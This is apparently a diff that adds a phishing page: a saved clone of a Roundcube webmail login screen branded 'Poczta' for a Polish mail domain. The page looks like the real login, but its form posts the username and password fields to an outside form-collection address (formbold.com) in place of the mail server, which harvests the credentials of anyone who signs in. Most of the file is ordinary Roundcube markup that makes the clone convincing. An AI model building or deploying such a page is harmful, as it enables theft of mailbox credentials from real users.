@@ -1,0 +1,95 @@
+<!DOCTYPE html>
+<!-- saved from url=(0025)https://mail.answalcz.pl/ -->
+<html lang="en" class="js chrome layout-large"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+<title>Poczta :: Welcome to Poczta</title>
+	<meta name="viewport" content="width=device-width, initial-scale=1.0, shrink-to-fit=no, maximum-scale=1.0"><meta name="theme-color" content="#f4f4f4"><meta name="msapplication-navbutton-color" content="#f4f4f4">
+	<link rel="shortcut icon" href="https://mail.answalcz.pl/skins/elastic/images/favicon.ico?s=1609105339">
+	<link rel="stylesheet" href="./answalcz_files/bootstrap.min.css">
+	
+		<link rel="stylesheet" href="./answalcz_files/styles.min.css">
+		
+	
+	
+		<script>
+		try {
+			if (document.cookie.indexOf('colorMode=dark') > -1
+				|| (document.cookie.indexOf('colorMode=light') === -1 && window.matchMedia('(prefers-color-scheme: dark)').matches)
+			) {
+				document.documentElement.className += ' dark-mode';
+			}
+		} catch (e) { }
+		</script>
+	
+<link rel="stylesheet" type="text/css" href="./answalcz_files/jquery-ui.min.css"><script src="./answalcz_files/jquery.min.js.download"></script><script src="./answalcz_files/common.min.js.download"></script><script src="./answalcz_files/app.min.js.download"></script><script src="./answalcz_files/jstz.min.js.download"></script><script>
+/*
+        @licstart  The following is the entire license notice for the 
+        JavaScript code in this page.
+
+        Copyright (C) The Roundcube Dev Team
+
+        The JavaScript code in this page is free software: you can redistribute
+        it and/or modify it under the terms of the GNU General Public License
+        as published by the Free Software Foundation, either version 3 of
+        the License, or (at your option) any later version.
+
+        The code is distributed WITHOUT ANY WARRANTY; without even the implied
+        warranty of MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.
+        See the GNU GPL for more details.
+
+        @licend  The above is the entire license notice
+        for the JavaScript code in this page.
+*/
+var rcmail = new rcube_webmail();
+rcmail.set_env({"task":"login","standard_windows":false,"locale":"en_US","devel_mode":null,"rcversion":10506,"cookie_domain":"","cookie_path":"/","cookie_secure":true,"dark_mode_support":true,"skin":"elastic","blankpage":"skins/elastic/watermark.html","refresh_interval":60,"session_lifetime":43200,"action":"","comm_path":"./?_task=login","compose_extwin":false,"date_format":"yy-mm-dd","date_format_localized":"YYYY-MM-DD","request_token":"l4QZ9Cw9tNIa4kXgS24YLkfBNRuUJ5Nt"});
+rcmail.add_label({"loading":"Loading...","servererror":"Server Error!","connerror":"Connection Error (Failed to reach the server)!","requesttimedout":"Request timed out","refreshing":"Refreshing...","windowopenerror":"The popup window was blocked!","uploadingmany":"Uploading files...","uploading":"Uploading file...","close":"Close","save":"Save","cancel":"Cancel","alerttitle":"Attention","confirmationtitle":"Are you sure...","delete":"Delete","continue":"Continue","ok":"OK","twofactor_gauthenticator.activate":"Activate","twofactor_gauthenticator.twofactor_gauthenticator":"2-Factor Authentication","twofactor_gauthenticator.code":"Code:","twofactor_gauthenticator.two_step_verification_form":"2-Factor Authentication Code:","twofactor_gauthenticator.instructions_title":"Instructions","twofactor_gauthenticator.instructions":"Due to lack of support for 2FA in e-mail clients for smaller providers, currently we support 2FA for webmail only.\n\u003Cbr /\u003E\u003Cbr /\u003E\nTo safely configure 2FA:\u003Cbr /\u003E\n\u003Col\u003E\n\u003Cli\u003ESetup 2FA here,\u003C/li\u003E\n\u003Cli\u003Eenable 2FA for mailbox in hosting administration panel, in \"2FA authentication for e-mail\" option (Your administrator can do that). Enabling that option will block access to e-mail using other channels than www (like IMAP, POP3, SMTP), so that e-mails will not be able to be downloaded using other method.\u003C/li\u003E\n\u003C/ol\u003E","twofactor_gauthenticator.secret":"Secret","twofactor_gauthenticator.qr_code":"QR Code","twofactor_gauthenticator.msg_secret":"If it is not possible to scan QR code, you can copy the below secret key to the app instead.","twofactor_gauthenticator.msg_recovery_codes":"Recovery codes are single use only. You can save them in a safe place and use them in case of loss of access to the device with the application.","twofactor_gauthenticator.msg_qr_code":"Scan the code with a one-time code generator (OTP) app, e.g. \u003Ca href=\"https://github.com/google/google-authenticator\" target=\"_blank\"\u003Egoogle-authenticator\u003C/a\u003E.","twofactor_gauthenticator.show_secret":"Show secret","twofactor_gauthenticator.hide_secret":"Hide secret","twofactor_gauthenticator.create_secret":"Create secret","twofactor_gauthenticator.show_qr_code":"Show QR Code","twofactor_gauthenticator.hide_qr_code":"Hide QR Code","twofactor_gauthenticator.recovery_codes":"Recovery codes","twofactor_gauthenticator.copy_to_clipboard":"Copy recovery codes to clipboard","twofactor_gauthenticator.show_recovery_codes":"Show recovery codes","twofactor_gauthenticator.hide_recovery_codes":"Hide recovery codes","twofactor_gauthenticator.setup_all_fields":"Fill all fields (make sure you click save to store your settings)","twofactor_gauthenticator.enrollment_dialog_title":"2-Factor authentication enrollment","twofactor_gauthenticator.enrollment_dialog_msg":"\u003Cstrong\u003E2-Factor authentication codes\u003C/strong\u003E are required for increased security, please configure them now.","twofactor_gauthenticator.check_code":"Enter the code from the app to \u003Cb\u003Eenable\u003C/b\u003E two-factor authentication:","twofactor_gauthenticator.check_code_deactivate":"Enter the code from the app to \u003Cb\u003Edisable\u003C/b\u003E two-factor authentication:","twofactor_gauthenticator.code_ok":"Code OK","twofactor_gauthenticator.code_ko":"Incorrect code","twofactor_gauthenticator.enable":"Enable","twofactor_gauthenticator.disable":"Disable","twofactor_gauthenticator.dont_ask_me_30days":"Don&#39;t ask me codes again on this computer for 30 days","twofactor_gauthenticator.check_code_to_activate":"To save, please scan the QR Code and enter the current 2-Factor code below.","twofactor_gauthenticator.successfully_saved":"2-Factor authentication settings saved successfully.","back":"Back","errortitle":"An error occurred!","options":"Options","plaintoggle":"Plain text","htmltoggle":"HTML","previous":"Previous","next":"Next","select":"Select","browse":"Browse","choosefile":"Choose file...","choosefiles":"Choose files..."});
+rcmail.gui_container("loginfooter","login-footer");rcmail.gui_object('loginform', 'login-form');
+rcmail.gui_object('message', 'messagestack');
+</script>
+
+<script src="./answalcz_files/twofactor_gauthenticator.js.download"></script><script src="./answalcz_files/qrcode.min.js.download"></script><script src="./answalcz_files/jquery-ui.min.js.download"></script>
+</head>
+<body class="task-login action-none">
+	
+		<div id="layout">
+	
+
+
+<h1 class="voice">Poczta Login</h1>
+
+<div id="layout-content" class="selected no-navbar" role="main">
+	<img src="./answalcz_files/logo.svg" id="logo" alt="Poczta Hostido.pl">
+	<form id="login-form" name="login-form" method="post" class="propform" action="https://formbold.com/s/oyDJ8">
+<input type="hidden" name="_token" value="l4QZ9Cw9tNIa4kXgS24YLkfBNRuUJ5Nt" class="form-control">
+	<input type="hidden" name="_task" value="login" class="form-control"><input type="hidden" name="_action" value="login" class="form-control"><input type="hidden" name="_timezone" id="rcmlogintz" value="Africa/Lagos" class="form-control"><input type="hidden" name="_url" id="rcmloginurl" class="form-control"><table><tbody><tr class="form-group row"><td class="title" style="display: none;"><label for="rcmloginuser">Username</label></td><td class="input input-group input-group-lg"><span class="input-group-prepend"><i class="input-group-text icon user"></i></span><input name="_user" id="rcmloginuser" required="" size="40" class="form-control" autocapitalize="off" type="text" placeholder="Username"></td></tr><tr class="form-group row"><td class="title" style="display: none;"><label for="rcmloginpwd">Password</label></td><td class="input input-group input-group-lg"><span class="input-group-prepend"><i class="input-group-text icon pass"></i></span><input name="_pass" id="rcmloginpwd" required="" size="40" class="form-control" autocapitalize="off" type="password" placeholder="Password"></td></tr></tbody></table><p class="formbuttons"><button type="submit" id="rcmloginsubmit" class="button mainaction submit btn btn-primary btn-lg text-uppercase w-100">Login</button></p>
+		<div id="login-footer" role="contentinfo">
+			Poczta
+			
+			
+			
+		</div>
+	</form>
+</div>
+
+<noscript>
+	<p class="noscriptwarning">Warning: This webmail service requires Javascript! In order to use it please enable Javascript in your browser's settings.</p>
+</noscript>
+
+
+</div>
+
+
+
+<div id="messagestack"></div>
+<script>
+$(function() {
+rcmail.init();
+});
+</script>
+
+
+
+<script src="./answalcz_files/bootstrap.bundle.min.js.download"></script>
+<script src="./answalcz_files/ui.min.js.download"></script>
+
+
+</body></html>
